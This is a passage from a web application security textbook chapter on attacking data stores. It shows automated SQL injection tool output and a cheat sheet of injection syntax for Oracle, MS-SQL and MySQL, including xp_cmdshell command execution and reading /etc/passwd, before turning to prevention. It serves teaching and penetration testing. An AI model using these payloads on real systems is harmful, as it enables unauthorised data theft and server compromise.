parenthesis
[14:54:44] [INFO] testing unescaped numeric injection on GET parameter
‘Empno’
[14:54:46] [INFO] confirming unescaped numeric injection on GET
parameter ‘Empno’
[14:54:47] [INFO] GET parameter ‘Empno’ is unescaped numeric injectable
with 0
parenthesis
[14:54:47] [INFO] testing for parenthesis on injectable parameter
[14:54:50] [INFO] the injectable parameter requires 0 parenthesis
[14:54:50] [INFO] testing MySQL
[14:54:51] [WARNING] the back-end DMBS is not MySQL
[14:54:51] [INFO] testing Oracle
[14:54:52] [INFO] confirming Oracle
[14:54:53] [INFO] the back-end DBMS is Oracle
web server operating system: Windows 2000
web application technology: ASP, Microsoft IIS 5.0
back-end DBMS: Oracle
[14:54:53] [INFO] testing inband sql injection on parameter ‘Empno’ with
NULL
bruteforcing technique
[14:54:58] [INFO] confirming full inband sql injection on parameter
‘Empno’
[14:55:00] [INFO] the target url is affected by an exploitable full
inband
sql injection vulnerability
valid union: ‘http://wahh-app.com:80/employees.asp?Empno=7369%20
UNION%20ALL%20SEL
ECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20DUAL--%20AND%20
3663=3663’
[14:55:00] [INFO] calling Oracle shell. To quit type ‘x’ or ‘q’ and
press ENTER
sql-shell> select banner from v$version
do you want to retrieve the SQL statement output? [Y/n]
[14:55:19] [INFO] fetching SQL SELECT statement query output: ‘select banner
from v$version’
select banner from v$version [5]:
[*] CORE 9.2.0.1.0 Production
[*] NLSRTL Version 9.2.0.1.0 - Production
[*] Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production
[*] PL/SQL Release 9.2.0.1.0 - Production
[*] TNS for 32-bit Windows: Version 9.2.0.1.0 - Production
sql-shell>
cc0099..iinndddd 333311 88//1199//22001111 1122::0099::3322 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 332
332 Chapter 9 n Attacking Data Stores
SQL Syntax and Error Reference
We have described numerous techniques that enable you to probe for and
exploit SQL injection vulnerabilities in web applications. In many cases, there
are minor differences between the syntax that you need to employ against
different back-end database platforms. Furthermore, every database produces
different error messages whose meaning you need to understand both when
probing for fl aws and when attempting to craft an effective exploit. The fol-
lowing pages contain a brief cheat sheet that you can use to look up the exact
syntax you need for a particular task and to decipher any unfamiliar error
messages you encounter.
SQL Syntax
Requirement: ASCII and SUBSTRING
Oracle: ASCII(‘A’) is equal to 65
SUBSTR(‘ABCDE’,2,3) is equal to BCD
MS-SQL: ASCII(‘A’) is equal to 65
SUBSTRING(‘ABCDE’,2,3) is equal to BCD
MySQL: ASCII(‘A’) is equal to 65
SUBSTRING(‘ABCDE’,2,3) is equal to BCD
Requirement: Retrieve current database user
Oracle: Select Sys.login_user from dual SELECT
user FROM dual SYS_CONTEXT(‘USERENV’,
‘SESSION_USER’)
MS-SQL: select suser_sname()
MySQL: SELECT user()
Requirement: Cause a time delay
Oracle: Utl_Http.request(‘http://madeupserver.com’)
MS-SQL: waitfor delay ‘0:0:10’
exec master..xp_cmdshell ‘ping localhost’
MySQL: sleep(100)
cc0099..iinndddd 333322 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 333
Chapter 9 n Attacking Data Stores 333
Requirement: Retrieve database version string
Oracle: select banner from v$version
MS-SQL: select @@version
MySQL: select @@version
Requirement: Retrieve current database
Oracle: SELECT SYS_CONTEXT(‘USERENV’,’DB_NAME’) FROM dual
MS-SQL: SELECT db_name()
The server name can be retrieved using:
SELECT @@servername
MySQL: SELECT database()
Requirement: Retrieve current user’s privilege
Oracle: SELECT privilege FROM session_privs
MS-SQL: SELECT grantee, table_name, privilege_type FROM
INFORMATION_SCHEMA.TABLE_PRIVILEGES
MySQL: S ELECT * FROM information_schema.user_privileges
WHERE grantee = ‘[user]’ where [user] is determined
from the output of SELECT user()
Requirement: Show all tables and columns in a single column of results
Oracle: Select table_name||’
‘||column_name from all_tab_columns
MS-SQL: SELECT table_name+’
‘+column_name from information_schema.columns
MySQL: SELECT CONCAT(table_name,
‘,column_name) from information_schema.columns
Requirement: Show user objects
Oracle: SELECT object_name, object_type FROM user_objects
MS-SQL: SELECT name FROM sysobjects
MySQL: S ELECT table_name FROM information_schema.tables
(or trigger_name from information_schema.triggers, etc.)
Continued
cc0099..iinndddd 333333 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 334
334 Chapter 9 n Attacking Data Stores
(continued)
Requirement: Show user tables
Oracle: SELECT object_name, object_type FROM user_objects
WHERE object_type=’TABLE’
Or to show all tables to which the user has access:
SELECT table_name FROM all_tables
MS-SQL: SELECT name FROM sysobjects WHERE xtype=’U’
MySQL: SELECT table_name FROM information_schema.
tables where table_type=’BASE TABLE’ and
table_schema!=’mysql’
Requirement: Show column names for table foo
Oracle: SELECT column_name, name FROM user_tab_columns
WHERE table_name = ‘FOO’
Use the ALL_tab_columns table if the target data is not owned
by the current application user.
MS-SQL: SELECT column_name FROM information_schema.columns
WHERE table_name=’foo’
MySQL: SELECT column_name FROM information_schema.columns
WHERE table_name=’foo’
Requirement: Interact with the operating system (simplest ways)
Oracle: See TheOracleHacker’sHandbook by David Litchfi eld
MS-SQL: EXEC xp_cmshell ‘dir c:\ ‘
MySQL: SELECT load_file(‘/etc/passwd’)
SQL Error Messages
Oracle: ORA-01756: quoted string not properly terminated
ORA-00933: SQL command not properly ended
MS-SQL: Msg 170, Level 15, State 1, Line 1
Line 1: Incorrect syntax near ‘foo’
Msg 105, Level 15, State 1, Line 1
Unclosed quotation mark before the character string
‘foo’
cc0099..iinndddd 333344 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 335
Chapter 9 n Attacking Data Stores 335
MySQL: You have an error in your SQL syntax. Check the man-
ual that corresponds to your MySQL server version
for the right syntax to use near ‘’foo’ at line X
Translation: For Oracle and MS-SQL, SQL injection is present, and it is almost
certainly exploitable! If you entered a single quote and it altered
the syntax of the database query, this is the error you’d expect. For
MySQL, SQL injection may be present, but the same error message
can appear in other contexts.
Oracle: PLS-00306: wrong number or types of arguments in
call to ‘XXX’
MS-SQL: Procedure ‘XXX’ expects parameter ‘@YYY’, which was
not supplied
MySQL: N/A
Translation: You have commented out or removed a variable that normally would
be supplied to the database. In MS-SQL, you should be able to use
time delay techniques to perform arbitrary data retrieval.
Oracle: ORA-01789: query block has incorrect number of
result columns
MS-SQL: Msg 205, Level 16, State 1, Line 1
All queries in a SQL statement containing a UNION
operator must have an equal number of expressions in
their target lists.
MySQL: The used SELECT statements have a different number
of columns
Translation: You will see this when you are attempting a UNION SELECT attack,
and you have specifi ed a different number of columns to the number
in the original SELECT statement.
Oracle: ORA-01790: expression must have same datatype as
corresponding expression
MS-SQL: Msg 245, Level 16, State 1, Line 1
Syntax error converting the varchar value ‘foo’ to a
column of data type int.
MySQL: (MySQL will not give you an error.)
Translation: You will see this when you are attempting a UNION SELECT attack,
and you have specifi ed a different data type from that found in the
original SELECT statement. Try using a NULL, or using 1 or 2000.
Continued
cc0099..iinndddd 333355 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 336
336 Chapter 9 n Attacking Data Stores
(continued)
Oracle: ORA-01722: invalid number
ORA-01858: a non-numeric character was found where a
numeric was expected
MS-SQL: Msg 245, Level 16, State 1, Line 1
Syntax error converting the varchar value ‘foo’ to a
column of data type int.
MySQL: (MySQL will not give you an error.)
Translation: Your input doesn’t match the expected data type for the fi eld. You
may have SQL injection, and you may not need a single quote, so
try simply entering a number followed by your SQL to be injected. In
MS-SQL, you should be able to return any string value with this error
message.
Oracle: ORA-00923: FROM keyword not found where expected
MS-SQL: N/A
MySQL: N/A
Translation: The following will work in MS-SQL:
SELECT 1
But in Oracle, if you want to return something, you must select from
a table. The DUAL table will do fi ne:
SELECT 1 from DUAL
Oracle: ORA-00936: missing expression
MS-SQL: Msg 156, Level 15, State 1, Line 1Incorrect syntax
near the keyword ‘from’.
MySQL: You have an error in your SQL syntax. Check the
manual that corresponds to your MySQL server version
for the right syntax to use near ‘ XXX , YYY from
SOME_TABLE’ at line 1
Translation: You commonly see this error message when your injection point
occurs before the FROM keyword (for example, you have injected
into the columns to be returned) and/or you have used the com-
ment character to remove required SQL keywords. Try completing the
SQL statement yourself while using your comment character. MySQL
should helpfully reveal the column names XXX, YYY when this condi-
tion is encountered.
cc0099..iinndddd 333366 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 337
Chapter 9 n Attacking Data Stores 337
Oracle: ORA-00972:identifier is too long
MS-SQL: String or binary data would be truncated.
MySQL: N/A
Translation: This does not indicate SQL injection. You may see this error message
if you have entered a long string. You’re unlikely to get a buffer over-
fl ow here either, because the database is handling your input safely.
Oracle: ORA-00942: table or view does not exist
MS-SQL: Msg 208, Level 16, State 1, Line 1
Invalid object name ‘foo’
MySQL: Table ‘DBNAME.SOMETABLE’ doesn’t exist
Translation: Either you are trying to access a table or view that does not exist, or,
in the case of Oracle, the database user does not have privileges for
the table or view. Test your query against a table you know you have
access to, such as DUAL. MySQL should helpfully reveal the current
database schema DBNAME when this condition is encountered.
Oracle: ORA-00920: invalid relational operator
MS-SQL: Msg 170, Level 15, State 1, Line 1
Line 1: Incorrect syntax near foo
MySQL: You have an error in your SQL syntax. Check the
manual that corresponds to your MySQL server version
for the right syntax to use near ‘’ at line 1
Translation: You were probably altering something in a WHERE clause, and your
SQL injection attempt has disrupted the grammar.
Oracle: ORA-00907: missing right parenthesis
MS-SQL: N/A
MySQL: You have an error in your SQL syntax. Check the
manual that corresponds to your MySQL server version
for the right syntax to use near ‘’ at line 1
Translation: Your SQL injection attempt has worked, but the injection point was
inside parentheses. You probably commented out the closing paren-
thesis with injected comment characters (--).
Continued
cc0099..iinndddd 333377 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 338
338 Chapter 9 n Attacking Data Stores
(continued)
Oracle: ORA-00900: invalid SQL statement
MS-SQL: Msg 170, Level 15, State 1, Line 1
Line 1: Incorrect syntax near foo
MySQL: You have an error in your SQL syntax. Check the
manual that corresponds to your MySQL server version
for the right syntax to use near XXXXXX
Translation: A general error message. The error messages listed previously all take
precedence, so something else went wrong. It’s likely you can try
alternative input and get a more meaningful message.
Oracle: ORA-03001: unimplemented feature
MS-SQL: N/A
MySQL: N/A
Translation: You have tried to perform an action that Oracle does not allow. This
can happen if you were trying to display the database version string
from v$version but you were in an UPDATE or INSERT query.
Oracle: ORA-02030: can only select from fixed tables/views
MS-SQL: N/A
MySQL: N/A
Translation: You were probably trying to edit a SYSTEM view. This can hap-
pen if you were trying to display the database version string from
v$version but you were in an UPDATE or INSERT query.
Preventing SQL Injection
Despite all its different manifestations, and the complexities that can arise in its
exploitation, SQL injection is in general one of the easier vulnerabilities to prevent.
Nevertheless, discussion about SQL injection countermeasures is frequently mislead-
ing, and many people rely on defensive measures that are only partially effective.
Partially Effective Measures
Because of the prominence of the single quotation mark in the standard expla-
nations of SQL injection fl aws, a common approach to preventing attacks is to
escape any single quotation marks within user input by doubling them. You
have already seen two situations in which this approach fails:
n If numeric user-supplied data is being embedded into SQL queries, this
is not usually encapsulated within single quotation marks. Hence, an
cc0099..iinndddd 333388 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 339
Chapter 9 n Attacking Data Stores 339
attacker can break out of the data context and begin entering arbitrary
SQL without the need to supply a single quotation mark.